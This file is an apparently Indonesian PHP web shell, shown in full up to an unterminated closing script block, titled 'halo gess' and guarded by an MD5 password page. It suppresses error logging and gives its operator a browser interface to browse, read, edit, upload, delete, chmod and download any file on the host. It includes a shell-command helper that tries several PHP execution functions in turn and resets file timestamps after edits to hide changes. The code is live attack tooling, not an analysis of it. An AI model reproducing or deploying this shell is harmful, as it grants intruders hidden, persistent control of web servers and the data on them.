<?php
@error_reporting(0);
@ini_set('error_log',0);
@ini_set('display_errors',0);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('memory_limit', '256M');
$auth_pass = '30f5eef91a397e4bbab4d93aeb286aef'; /* a1b */
$stitle = ".:: [ halo gess ] ::.";
$webprotocol = isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1) || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https' ? "https://" : "http://";
$weburl	= $webprotocol . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']);
if(!isset($_SESSION)){session_start();}
if(!function_exists("scandir")){
	function scandir($dir) {
		$dh = @opendir($dir);
		while (false !== ($filename = @readdir($dh))){
			$files[] = $filename;
		}
		return $files;
	}
}
function ex($in){
	$out = '';
	if(function_exists('exec')){
		@exec($in,$out);
		$out = @join("\n",$out);
	} elseif(function_exists('passthru')){
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
	} elseif(function_exists('system')){
		ob_start();
		@system($in);
		$out = ob_get_clean();
	} elseif(function_exists('shell_exec')){
		$out = shell_exec($in);
	} elseif(is_resource($f = @popen($in,"r"))){
		$out = "";
		while(!@feof($f))
			$out .= fread($f, filesize($f));
		pclose($f);
	}
	return $out;
}
function which($p){
	$path = ex('which '.$p);
	if(!empty($path))
		return $path;
	return false;
}
function cf($f,$t){
	$w=@fopen($f,"w") or @function_exists('file_put_contents');
	if($w)    {
		@fwrite($w,@base64_decode($t)) or @fputs($w,@base64_decode($t)) or @file_put_contents($f,@base64_decode($t));
		@fclose($w);
	}
}
function statusnya($file){
	$statusnya = @fileperms($file);
	if(($statusnya & 0xC000) == 0xC000){ $ingfo = 's'; /* Socket */ }
	elseif(($statusnya & 0xA000) == 0xA000){ $ingfo = 'l'; /* Symbolic Link */ }
	elseif(($statusnya & 0x8000) == 0x8000){ $ingfo = '-'; /* Regular */ }
	elseif(($statusnya & 0x6000) == 0x6000){ $ingfo = 'b'; /* Block special */ }
	elseif(($statusnya & 0x4000) == 0x4000){ $ingfo = 'd'; /* Directory */ }
	elseif(($statusnya & 0x2000) == 0x2000){ $ingfo = 'c'; /* Character special */ }
	elseif(($statusnya & 0x1000) == 0x1000){ $ingfo = 'p'; /* FIFO pipe */ }
	else { $ingfo = 'u'; /* Unknown */ }
	// Owner
	$ingfo .= ($statusnya & 0x0100) ? 'r' : '-';
	$ingfo .= ($statusnya & 0x0080) ? 'w' : '-';
	$ingfo .= (($statusnya & 0x0040) ? (($statusnya & 0x0800) ? 's' : 'x' ) : (($statusnya & 0x0800) ? 'S' : '-'));
	// Group
	$ingfo .= ($statusnya & 0x0020) ? 'r' : '-';
	$ingfo .= ($statusnya & 0x0010) ? 'w' : '-';
	$ingfo .= (($statusnya & 0x0008) ? (($statusnya & 0x0400) ? 's' : 'x' ) : (($statusnya & 0x0400) ? 'S' : '-'));
	// World
	$ingfo .= ($statusnya & 0x0004) ? 'r' : '-';
	$ingfo .= ($statusnya & 0x0002) ? 'w' : '-';
	$ingfo .= (($statusnya & 0x0001) ? (($statusnya & 0x0200) ? 't' : 'x' ) : (($statusnya & 0x0200) ? 'T' : '-'));
	return $ingfo;
}
function sizeFilter($bytes){
    $label = array('B', 'KB', 'MB', 'GB', 'TB', 'PB');
    for($i = 0; $bytes >= 1024 && $i < ( count( $label ) -1 ); $bytes /= 1024, $i++);
    return(round($bytes, 2) . " " . $label[$i]);
}
function xrmdir($dir){
    $items = @scandir($dir);
	if($items){
		foreach($items as $item) {
			if($item === '.' || $item === '..'){
				continue;
			}
			$path = $dir.'/'.$item;
			if(@is_dir($path)){
				xrmdir($path);
			} else {
				@unlink($path);
			}
		}
		rmdir($dir);
	}
}
function urutberkas($a){
	$b = @scandir($a);
	$i = array();
	foreach($b as $v){
		$dir = $a.'/'.$v;
		if(@is_dir($dir) && !in_array($v, ['.', '..'])){
			$i[] = array('type' => 'dir', 'entry' => $v, 'entry_path' => $a, 'full_path' => $dir);
		} else {
			if(!in_array($v, ['.', '..'])){
				$i[] = array('type' => 'file', 'entry' => $v, 'entry_path' => $a, 'full_path'=> $dir);
			}
		}
	}
	$col1 = array_column($i, 'type');
	$col2 = array_column($i, 'entry');
	array_multisort($col1, SORT_ASC, $col2, SORT_ASC, $i);
	return $i;
}
function pathberkas($a){
	$lokasiberkas = explode('/', $a);
	if(isset($lokasiberkas) && count($lokasiberkas)>0){
		$outs = '<nav aria-label="breadcrumb"><ol class="breadcrumb">';
		foreach($lokasiberkas as $id => $lok){
			if($lok == '' && $id == 0){
				$link = true;
				$outs .= '<li class="breadcrumb-item"><a href="#!" id="ffmanager" data-li="'.$id.'" data-path="/">~$</a></li>';
				continue;
			}
			if($lok == ''){continue;}
			$outs .= '<li class="breadcrumb-item dir'.$id.'"><a href="#!" id="ffmanager" data-li="'.$id.'" data-path="';
			for($i=0;$i<=$id;$i++){
				$outs .= $lokasiberkas[$i];
				if($i != $id){
					$outs .= '/';
				}
			}
			$outs .= '">'.$lok.'</a></li>';
		}
		$outs .= "</ol></nav>";
	} else {
		$outs = "<code>gak bisa baca direktori ini gess..</code>";
	}
	return $outs;
}
function filemanager($fm){
	$lokasinya = urutberkas($fm);
	$fmtable = "<div class='d-block'>".pathberkas($fm)."</div><div class='table-responsive'>";
	$fmtable .= "<table class='table table-sm table-hover table-bordered table-striped w-100 mb-0'>
		<thead class='bg-dark text-light'>
			<tr>
				<th class='text-center' style='min-width:150px;'>Name</th>
				<th class='text-center' style='min-width:80px;'>Size</th>
				<th class='text-center' style='min-width:100px;'>Create</th>
				<th class='text-center' style='min-width:125px;'>Owner / Group</th>
				<th class='text-center' style='min-width:100px;'>Perm</th>
				<th class='text-center' style='min-width:90px;'>Options</th>
			</tr>
		</thead>
		<tbody>";
	if(isset($lokasinya) && count($lokasinya)>0){
		foreach($lokasinya as $kl => $dir){
			$ow = @posix_getpwuid(@fileowner($dir['full_path']));
			$gr = @posix_getgrgid(@filegroup($dir['full_path']));
			$owners = $ow['name'] ? $ow['name'] : @fileowner($dir['full_path']);
			$groups = $gr['name'] ? $gr['name'] : @fileowner($dir['full_path']);
			if($dir['type'] == 'dir'){
				$txcol = @is_writable($dir['full_path']) ? 'text-success' : 'text-danger';
				$dlinks = !is_readable($dir['full_path']) ? $dir['entry'] : "<a href='#!' class='{$txcol}' id='fxmanager' data-path='{$dir['full_path']}'>{$dir['entry']}</a>";
				$formsel = "";
				$formper = statusnya($dir['full_path']);
				if(!in_array($dir['entry'], ['.', '..'])){
					$formper = "<a href='#' class='{$txcol}' data-toggle='modal' data-target='#showchmod' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xperm='".substr(sprintf('%o', fileperms($dir['full_path'])), -4)."'/>" . statusnya($dir['full_path']) . "</a>";
					$formsel = "<select class='custom-select custom-select-sm' id='showaksi'>
						<option value=''></option>
						<option value='rename' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>rename</option>
						<option value='del' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>del</option>
					</select>";
				}
				$fmtable .= "<tr>
					<td class='text-left align-middle'><i class='fa-regular fa-folder fa-fw mr-2'></i>{$dlinks}</td>
					<td class='text-center align-middle'>-</td>
					<td class='text-center align-middle'>".date('Y-m-d H:i:s',filectime($dir['full_path']))."</td>
					<td class='text-center align-middle'>{$owners} / {$groups}</td>
					<td class='text-center align-middle'>{$formper}</td>
					<td class='text-center align-middle'>{$formsel}</td>
				</tr>";
			} else {
				$fcolor = @is_writable($dir['full_path']) ? 'text-success' : 'text-danger';
				$flinks = !is_readable($dir['full_path']) ? $dir['entry'] : "<a href='#' class='{$fcolor}' data-toggle='modal' data-target='#showchmod' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xperm='".substr(sprintf('%o', fileperms($dir['full_path'])), -4)."'/>" . statusnya($dir['full_path']) . "</a>";
				$size = sizeFilter(filesize($dir['full_path']));
				$fmtable .= "<tr>
					<td class='text-left align-middle'><i class='fa-regular fa-file-lines fa-fw mr-2'></i>{$dir['entry']}</td>
					<td class='text-center align-middle'>{$size}</td>
					<td class='text-center align-middle'>".date('Y-m-d H:i:s',filectime($dir['full_path']))."</td>
					<td class='text-center align-middle'>{$owners} / {$groups}</td>
					<td class='text-center align-middle'>{$flinks}</td>
					<td class='text-center align-middle'>
						<select class='custom-select custom-select-sm' id='showaksi'>
							<option value=''></option>
							<option value='view' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>view</option>
							<option value='edit' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>edit</option>
							<option value='del' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>del</option>
							<option value='rename' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>rename</option>
							<option value='download' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>download</option>
						</select>
					</td>
				</tr>";
			}
		}
	} else {
		$fmtable .= "<tr><td class='text-center' colspan='6'>Direktori tidak berisi file apapun</td></tr>";
	}
	$fmtable .= "</tbody></table></div>";
	return $fmtable;
}

if(isset($_GET['act'])){
	if($_GET['act'] == 'mkdir'){
		$ndir = isset($_POST['xdir']) && !empty($_POST['xdir']) ? $_POST['xdir'] : '';
		if(!empty($ndir)){
			$xpath = $_POST['xpath']."/".$ndir;
			if($_POST['xtype'] == 'dir'){
				if(!is_dir($xpath)){
					if(@mkdir($xpath, 0755, true)){
						$outs = "Direktori berhasil dibuat!";
					} else {
						$outs = @iconv('UTF-8', 'UTF-8', addcslashes(ex("mkdir ".$xpath),"\r\t\\'\0")) ? "Direktori berhasil dibuat!" : "Gagal membuat direktori!";
					}
				} else {
					$outs = "Direktori sudah ada!";
				}
			} else {
				if($_POST['xtype'] == 'file'){
					if(!file_exists($xpath)){
						$fp = @fopen($xpath, 'w');
						if($fp){
							$xpath = "ok, tinggal di edit..";
							fclose($fp);
						}
						$outs = "File berhasil dibuat!";
					} else {
						$outs = "Gagal membuat file!";
					}
				} else {
					$outs = "Anda mw buat apa??";
				}
			}
		} else {
			$outs = "Path tidak valid!";
		}
		echo "<code>{$outs}</code>";
		die();
	} else if($_GET['act'] == 'readfile'){
		if(isset($_POST['xpath']) && !empty($_POST['xpath'])){
			$xpath = $_POST['xpath'];			
			if(@is_readable($xpath)){
				$outs = '';
				$fp = @fopen($xpath, 'r');
				if($fp){
					while(!@feof($fp)){$outs .= htmlspecialchars(@fread($fp, @filesize($xpath)));}
					@fclose($fp);
				}
			} else {
				$outs = "File tidak di temukan!";
			}
		} else {
			$outs = "File yang mw dibaca, gk ada!";
		}
		echo $outs;
		die();
	} else if($_GET['act'] == 'upload'){
		@ini_set('output_buffering', 0);
		$xpath = $_POST['xpath'];
		$lawlx = @$_FILES['xfile'];
		$upfiles = @file_put_contents($xpath."/".$lawlx['name'], @file_get_contents($lawlx['tmp_name']));
		if($upfiles){
			$outs = file_exists($xpath."/".$lawlx['name']) ? "uploaded!" : "failed";
		} else {
			$outs = "failed";
		}
		echo "<code>{$outs}</code>";
		die();
	} else if($_GET['act'] == 'rename'){
		if(isset($_POST['xtype'], $_POST['xpath'], $_POST['xname'])){
			$df = $_POST['xpath'] .'/'. $_POST['xname'];
			$ren = @rename($df, $_POST['xname']);
			$outss = $ren == true ? 'Berhasil mengubah nama '.$_POST['xtype'] : 'Gagal mengubah nama '.$_POST['xtype'];
			echo $outss;
			die();
		}
	} else if($_GET['act'] == 'chmod'){
		if(isset($_POST['xperm']) && !empty($_POST['xperm'])){
			$xperm = $_POST['xperm'];
			$xtype = $_POST['xtype'];
			$xname = $_POST['xname'];
			$xpath = $_POST['xpath'];
			$perms = 0;
			for($i=strlen($xperm)-1;$i>=0;--$i){
				$perms += (int)$xperm[$i]*pow(8, (strlen($xperm)-$i-1));
			}
			$cm = @chmod("{$xpath}/{$xname}", $perms);
			$outss = $cm == true ? 'chmod '.$xtype.': '.$xname.', berhasil!' : 'chmod '.$xtype.': '.$xname.', gagal!';
		} else {
			$outss = 'Permission tidak boleh kosong!';
		}
		echo $outss;
		die();
	} else if($_GET['act'] == 'del'){
		if(isset($_POST['xtype'], $_POST['xname'], $_POST['xpath'])){
			$df = $_POST['xpath'] .'/'. $_POST['xname'];
			if(@is_dir($df)){
				xrmdir($df);
				$outss = file_exists($df) ? "Hapus dir gagal!" : "Hapus dir sukses!";
			} else if(@is_file($df)){
				@unlink($df);
				$outss = file_exists($df) ? "Hapus file gagal!" : "Hapus file sukses!";
			}
			echo $outss;
			die();
		}
	} else if($_GET['act'] == 'path'){
		$dirs = isset($_GET['dir']) && !empty($_GET['dir']) ? $_GET['dir'] : '/';
		if(isset($_GET['opt'], $_GET['entry'])){
			$df = $dirs .'/'. $_GET['entry'];
			if($_GET['opt'] == 'edit'){
				if(isset($_POST['xdata'])){
					$_POST['xdata'] = base64_decode($_POST['xdata']);
					$time = @filemtime($df);
					$fp = @fopen($df, 'w');
					if($fp){
						@fwrite($fp, $_POST['xdata']);
						@fclose($fp);
						$dout = "File berhasil di-edit!";
						@touch($df, $time, $time);
					} else {
						$dout = "File gagal di-edit!";
					}
				} else {
					if(!is_writable($df)){
						$dout = "File gak bisa di edit!";
					} else {
						$dout = "";
						$fp = @fopen($df, 'r');
						if($fp){
							while(!@feof($fp)){$dout .= htmlspecialchars(@fread($fp, @filesize($df)));}
							@fclose($fp);
						}
					}
				}
			} else if($_GET['opt'] == 'download'){
				if(isset($_GET['dir'], $_GET['entry'])){
					$df = $_GET['dir'] .'/'. $_GET['entry'];
					if(@is_file($df) && @is_readable($df)){
						header('Pragma: public');
						header('Expires: 0');
						header('Cache-Control: must-revalidate, post-check=0, pre-check=0'); 
						header('Content-Type: application/force-download');
						header('Content-Type: application/download');
						header('Content-Type: '.(function_exists('mime_content_type') ? @mime_content_type($df) : 'application/octet-stream'));
						header('Content-Description: File Transfer');
						header('Content-Disposition: attachment; filename='.basename($df));
						header('Content-Length: '.@filesize($df));
						header('Content-Transfer-Encoding: binary');
						$fp = @fopen($df, 'r');
						if($fp){
							while(!@feof($fp)) echo @fread($fp, @filesize($df));
							fclose($fp);
						}
						exit();
					} else {
						echo "File tidak dapat di download!'"; exit();
					}
				} else {
					echo "Tidak ada file yang dipilih!"; exit();
				}
			}
			echo $dout;
		} else {
			echo filemanager($dirs);
		}
		die();
	} else if($_GET['act'] == 'logout'){
		unset($_SESSION['auth']);
		header('location: '.$_SERVER['PHP_SELF']);
		exit();
	}
}
if(isset($_POST['xpass'])){
	if(md5($_POST['xpass']) == $auth_pass){
		$_SESSION['auth'] = $auth_pass;
		header('location: '.$_SERVER['PHP_SELF']);
		exit();
	} else {
		$statusLogin[] = 'wrong password :(';
	}
}
if(!isset($_SESSION['auth'])){
	echo "<html>
		<head><meta name='viewport' content='width=device-width, initial-scale=1'/><title>Restricted area</title><link rel='preconnect' href='https://fonts.googleapis.com'><link rel='preconnect' href='https://fonts.gstatic.com' crossorigin/><link href='https://fonts.googleapis.com/css2?family=Montserrat:ital@0;1&display=swap' rel='stylesheet'/></head>
		<body style='font-family: \"Montserrat\", sans-serif;'>
			<form action='' method='post'>
				<fieldset style='background-color:#eeeeee; border-radius:.3em; border:.5px solid #0066b6;'>
					<legend style='background-color:#0066b6; color:#fff; padding:5px 10px; border-radius:.3em;'>auth login:</legend>
					<label for='xpass'>pwd:</label>
					<input type='password' id='xpass' name='xpass' style='margin:5px; padding:5px 10px; border-radius:.3em; border:.5px solid #0066b6;'></input><input type='submit' value='GO' style='background-color:#0066b6; color:#fff; margin:5px; padding:5px 10px; border-radius:.3em; border:0;'></input>
					".(isset($statusLogin) ? "<br/><small style='color:#ff0000; font-style:italic;'>{$statusLogin[0]}</small>" : "")."
				</fieldset>
			</form>
		</body>
	</html>";
	die();
} else {
	$lokasiberkas = str_replace('\\','/', @getcwd());
?>
<!doctype html>
<html lang="en" class="bg-dark h-100">
	<head>
		<meta charset="utf-8"/>
		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
		<link rel="shortcut icon" href="https://clipart-library.com/data_images/554935.png"/>
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/css/bootstrap.min.css" integrity="sha512-rt/SrQ4UNIaGfDyEXZtNcyWvQeOq0QLygHluFQcSjaGB04IxWhal71tKuzP6K8eYXYB6vJV4pHkXcmFGGQ1/0w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
		<title><?php echo $stitle;?></title>
		<style>
		body, .blockquote{font-size:1em;}
		nav .nav-tabs{border-bottom:1px solid #0066b6;}
		nav .nav-tabs .nav-link.active{background:#0066b6; color:#fff;}
		nav .nav-tabs .nav-link:hover, nav .nav-tabs .nav-link.active{border:1px solid #0066b6;}
		.breadcrumb-item+.breadcrumb-item{padding-left:.2rem;}
		.breadcrumb-item+.breadcrumb-item::before{padding-right:.2rem;}
		.form-control-sm{height:auto;}
		@media screen and (max-width: 420px) {
			nav .nav-tabs .nav-link{padding:.5rem 1rem;letter-spacing:-.1em;}
			.btn{padding:0px 10px!important;}
		}
		@media screen and (max-width: 767px){
			.container{max-width:100% !important;}
			body, .btn, .blockquote, .input-group-text{font-size:.8em !important;}
			.form-control-sm{font-size:initial; height:auto;}
			.custom-select{font-size:inherit; height:auto !important;}
		}
		</style>
	</head>
	<body class="text-monospace">
		<header class="header bg-dark mt-auto py-3">
			<div class="container text-center my-2">
				<span class="text-light"><?php echo $stitle;?></span>
			</div>
		</header>
		<div class="container my-3">
			<nav>
				<div class="nav nav-tabs" id="nav-tab" role="tablist">
					<button class="nav-link active" id="fmanager" data-toggle="tab" data-target="#nav-berkas" type="button" role="tab" aria-controls="nav-berkas" aria-selected="false"><i class="fa-regular fa-folder-open d-block d-sm-none"></i><span class="d-none d-sm-block">Files</span></button>
					<a class="nav-link" type="button" href="?act=logout"><i class="fa-solid fa-right-from-bracket d-block d-sm-none"></i><span class="d-none d-sm-block">Logout</span></a>
				</div>
			</nav>
			<div class="tab-content mt-3" id="nav-tabContent">
				<div class="tab-pane show active fade" id="nav-berkas" role="tabpanel">
					<div class="row">
						<div class='col-12 mb-3' id="fileman"></div>
						<div class="col-sm-12 col-md-6">
							<form method="post" action="?act=changedir" class="mb-3" id="requestchdir">
								<div class="input-group">
									<div class="input-group-prepend">
										<label class="input-group-text">Change dir</label>
									</div>
									<input type="text" name="xpath" class="form-control form-control-sm"></input>
									<div class="input-group-append">
										<button class="btn btn-outline-secondary" type="submit">Go</button>
									</div>
								</div>
                     </form>
                  </div>
						<div class="col-sm-12 col-md-6">
							<form method="post" action="?act=mkdir" class="mb-3" id="requestmkdir">
								<input type="hidden" name="xpath" value=""/>
								<div class="input-group">
									<div class="input-group-prepend">
										<label class="input-group-text">Create</label>
									</div>
									<select class="custom-select" name="xtype" style="max-width:70px;">
										<option value="dir" selected>dir</option>
										<option value="file">file</option>
									</select>
									<input type="text" name="xdir" class="form-control form-control-sm" max-length="50"></input>
									<div class="input-group-append">
										<button class="btn btn-outline-secondary" type="submit">Go</button>
									</div>
								</div>
							</form>
						</div>
						<div class="col-sm-12 col-md-6">
							<form method="post" action="?act=readfile" class="mb-3" id="requestreadfile">
								<div class="input-group">
									<div class="input-group-prepend">
										<label class="input-group-text">Read files</label>
									</div>
									<input type="text" name="xpath" class="form-control form-control-sm"></input>
									<div class="input-group-append">
										<button class="btn btn-outline-secondary" type="submit">Go</button>
									</div>
								</div>
                     </form>
                  </div>
						<div class="col-sm-12 col-md-6">
							<form method="post" action="?act=upload" class="mb-3" id="requestupload">
								<input type="hidden" name="xpath" value=""/>
								<div class="input-group">
									<div class="custom-file">
										<input type="file" name="xfile" class="custom-file-input" id="titupl" aria-describedby="upld"></input>
										<label class="custom-file-label" for="titupl">Upload file</label>
									</div>
									<div class="input-group-append">
										<button class="btn btn-outline-secondary" type="submit" id="upld">Go</button>
									</div>
								</div>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="modal fade" id="modalshowaksi" data-backdrop="static" data-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
			<div class="modal-dialog modal-dialog-centered modal-dialog-scrollable modal-lg">
				<div class="modal-content">
					<div class="modal-header bg-dark">
						<h5 class="modal-title text-break text-light" id="staticBackdropLabel">title</h5>
						<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
					</div>
					<div class="modal-body"></div>
				</div>
			</div>
		</div>
		<div class="modal fade" id="showchmod" data-backdrop="static" data-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
			<div class="modal-dialog modal-dialog-centered modal-dialog-scrollable modal-lg">
				<div class="modal-content">
					<div class="modal-header bg-dark">
						<h5 class="modal-title text-break text-light" id="staticBackdropLabel">Change permissions</h5>
						<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
					</div>
					<div class="modal-body">
						<form method="post" action="?act=chmod" class="mb-3" id="requestchmod">
							<input type="hidden" name="xtype" value=""></input>
							<input type="hidden" name="xname" value=""></input>
							<input type="hidden" name="xpath" value=""></input>
							<div class="form-group row">
								<label for="xname" class="col-sm-2 col-form-label">File</label>
								<div class="col-sm-10">
									<input type="text" class="form-control" id="xname" readonly="readonly" value="" max-length="4"/>
								</div>
							</div>
							<div class="form-group row">
								<label for="xperm" class="col-sm-2 col-form-label">Permission</label>
								<div class="col-sm-10">
									<div class="input-group mb-3">
										<input type="text" class="form-control" id="xperm" name="xperm" value=""/>
										<div class="input-group-append">
											<button class="btn btn-outline-secondary" type="submit"><i class='fa-solid fa-angles-right'></i></button>
										</div>
									</div>
								</div>
							</div>
						</form>
					</div>
				</div>
			</div>
		</div>
		<footer class="footer bg-dark mt-auto py-2">
			<div class="container my-3">
				<blockquote class="blockquote text-center">
					<p class="text-light mb-0">A well-known quote.</p>
					<footer class="blockquote-footer">Saya hanya seorang penggila <cite>code!</cite></footer>
				</blockquote>
			</div>
		</footer>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js" integrity="sha512-3gJwYpMe3QewGELv8k/BX9vcqhryRdzRMxVfq6ngyWXwo03GFEzjsUm8Q7RZcHPHksttq7/GFoxjCVUjkjvPdw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/js/bootstrap.bundle.min.js" integrity="sha512-igl8WEUuas9k5dtnhKqyyld6TzzRjvMqLC79jkgT3z02FvJyHAuUtyemm/P/jYSne1xwFI06ezQxEwweaiV7VA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
		<script>
		(function($){
			function callbacks(act, path, name, respon){
				var mb = $('#modalshowaksi').find('.modal-body');
				$.ajax({
					type: 'get',
					url: '?act=path&dir='+path+'&entry='+name+'&opt='+act,
					beforeSend: function(){
						mb.html('<span><i class="fa-solid fa-spinner fa-spin-pulse fa-fw"></i> Tunggu bentar...</span>');
					}
				}).done(function(response){
					mb.html('');
					respon(response);
				}).fail(function(response, status, error){
					mb.html('error_code: '+response.status);
				});
			}
			function selactopt(selopt){
				for(var si = 0; si < selopt.length; si++){
					selopt[si].addEventListener('change', function(e){
						var x = $("option:selected", this)[0], act = x.value, om = $('#modalshowaksi'), mbody = '', mtit = '';
						var xtype = x.attributes['data-xtype'], xname = x.attributes['data-xname'], xpath = x.attributes['data-xpath'];
						if(act.length>0){
							switch(act){
								case 'rename':
									mtit = 'Rename '+(xtype.value).toUpperCase();
									mbody = '<form method="post" action="?act=rename" id="requestrename">'+
										'<input type="hidden" name="xtype" value="'+xtype.value+'"/>'+
										'<input type="hidden" name="xpath" value="'+xpath.value+'"/>'+
										'<div class="form-group row">'+
											'<label for="oname" class="col-sm-2 col-form-label">Name</label>'+
											'<div class="col-sm-10"><input type="text" class="form-control" id="oname" readonly="readonly" value="'+xname.value+'"/></div>'+
										'</div>'+
										'<div class="form-group row">'+
											'<label for="xname" class="col-sm-2 col-form-label">Rename</label>'+
											'<div class="col-sm-10">'+
												'<div class="input-group mb-3">'+
													'<input type="text" class="form-control" id="xname" name="xname" value="'+xname.value+'"/>'+
													'<div class="input-group-append"><button class="btn btn-outline-secondary" type="submit"><i class="fa-solid fa-angles-right"></i></button></div>'+
												'</div>'+
											'</div>'+
										'</div>'+
									'</form>';
								break;
								case 'del':
									mtit = 'Del '+(xtype.value).toUpperCase();
									mbody = '<form method="post" action="?act=del" id="requestdel" class="text-center">'+
										'<input type="hidden" name="xtype" value="'+xtype.value+'"/>'+
										'<input type="hidden" name="xname" value="'+xname.value+'"/>'+
										'<input type="hidden" name="xpath" value="'+xpath.value+'"/>'+
										'<div class="alert alert-danger">Yakin, '+(xtype.value).toUpperCase()+': /'+xname.value+' mw dihapus?!</div>'+
										'<button class="btn btn-outline-secondary" type="submit">Yakin pak!</button>'+
									'</form>';
								break;
							}
							if(act == 'download'){
								window.open('?act=path&dir='+xpath.value+'&entry='+xname.value+'&opt='+act, '_blank');
							} else {
								om.modal('show');
								om.find('.modal-title').html(mtit);
								om.find('.modal-body').html(mbody);
								om.on('hidden.bs.modal', function (e){
									om.find('.modal-title').html('unknown');
									om.find('.modal-body').html('null');
								});
								if(act == 'edit'){
									om.modal('show');
									om.find('.modal-title').html('Edit '+(xtype.value).toUpperCase()+': /'+xname.value);
									callbacks('view', xpath.value, xname.value, function(e){
										var mbody = '<form method="post" action="?act=path&dir='+xpath.value+'&entry='+xname.value+'&opt=edit" id="requesteditfile">'+
											'<div class="d-block mb-3"><textarea name="xdata" class="form-control" rows="20">'+e+'</textarea></div>'+
											'<center><button class="btn btn-outline-success text-center" type="submit">Simpan</button></center>'+
										'</form>';
										om.find('.modal-body').html(mbody);
									});
									om.on('hidden.bs.modal', function (e){
										om.find('.modal-title').html('unknown');
										om.find('.modal-body').html('null');
									});
								} else if(act == 'view'){
									om.modal('show');
									om.find('.modal-title').html('View '+(xtype.value).toUpperCase()+': /'+xname.value);
									callbacks('view', xpath.value, xname.value, function(e){
										om.find('.modal-body').attr('style', 'background:#dfdfdf;').html('<code><pre class="mb-0">'+e+'</pre></code>');
									});
									om.on('hidden.bs.modal', function (e){
										om.find('.modal-title').html('unknown');
										om.find('.modal-body').attr('style', '').html('null');
									});
								}
							}
						} else {
							om.modal('show');
							om.find('.modal-title').html('View null');
							callbacks('view', xpath.value, xname.value, function(e){
								om.find('.modal-body').attr('style', 'background:#dfdfdf;').html('<code>null</code>');
							});
							om.on('hidden.bs.modal', function (e){
								om.find('.modal-title').html('unknown');
								om.find('.modal-body').attr('style', '').html('null');
							});
						}
					}, false);
				}
			}
			function genfileman(path, callback){
				$.ajax({
					type: 'get',
					url: '?act=path&dir='+path,
					beforeSend: function(){
						$('#fileman').html('<i class="fa-solid fa-spinner fa-spin-pulse fa-fw"></i> Tunggu bentar...');
						$('form#requestupload,form#requestmkdir,form#requestchdir,form#requestreadfile').hide();
					},
					success: function(response){
						$('#fileman').html(response);
						$('form#requestupload,form#requestmkdir,form#requestchdir,form#requestreadfile').show().find('input[name="xpath"]').val(path);
						callback(response);
					}
				});
			}
			$('button#sqlmanager').on('click', function(e){
				e.preventDefault();
				$.ajax({
					type: 'get',
					url: '?act=path&dir=<?php echo $lokasiberkas;?>&entry=adminer&opt=create',
					beforeSend: function(){
						$('body').find('#sqlman').html('<i class="fa-solid fa-spinner fa-spin-pulse fa-fw"></i> Tunggu bentar...');
					},
					success: function(response){
						var resp = response == 'ok' ? '<p class="text-muted">Untuk tampilan penuh, <a href="<?php echo $weburl.'/adminer.php';?>" target="_blank">[klik disini]</a></p><div class="embed-responsive embed-responsive-16by9"><iframe class="embed-responsive-item" src="<?php echo $weburl.'/adminer.php';?>" allowfullscreen></iframe></div>' : response;
						$('body').find('#sqlman').html(resp);
					}
				});
			});
			$('button#fmanager').on('click', function(e){
				e.preventDefault();
				$.ajax({
					type: 'get',
					url: '?act=path&dir=<?php echo $lokasiberkas;?>',
					beforeSend: function(){
						$('body').find('#fileman').html('<i class="fa-solid fa-spinner fa-spin-pulse fa-fw"></i> Tunggu bentar...');
						$('form#requestupload,form#requestmkdir,form#requestchdir,form#requestreadfile').hide();
					},
					success: function(response){
						$('body').find('#fileman').html(response);
						$('form#requestupload,form#requestmkdir,form#requestchdir,form#requestreadfile').show().find('input[name="xpath"]').val('<?php echo $lokasiberkas;?>');
					}
				}).done(function(){
					var selopt = document.querySelectorAll('#showaksi');
					selactopt(selopt);
				});
			});
         var ckread = document.querySelectorAll('a#readable');
         for(var ick = 0; ick < ckread.length; ick++){
            ckread[ick].addEventListener('click', function(e){
               e.preventDefault();
               var x = $(this); om = $('#modalshowaksi'), mbody = '', mtit = '', xtype = x[0].attributes['data-xtype'], xname = x[0].attributes['data-xname'], xpath = x[0].attributes['data-xpath'];
					om.modal('show');
					if(xname.value == 'jumping' && xpath.value == '/'){
						om.find('.modal-title').html('View all readable /home directory');
						callbacks('view', xpath.value, xname.value, function(e){
							om.find('.modal-body').attr('style', 'background:#dfdfdf;').html('<code><pre class="mb-0">'+e+'</pre></code>');
						});
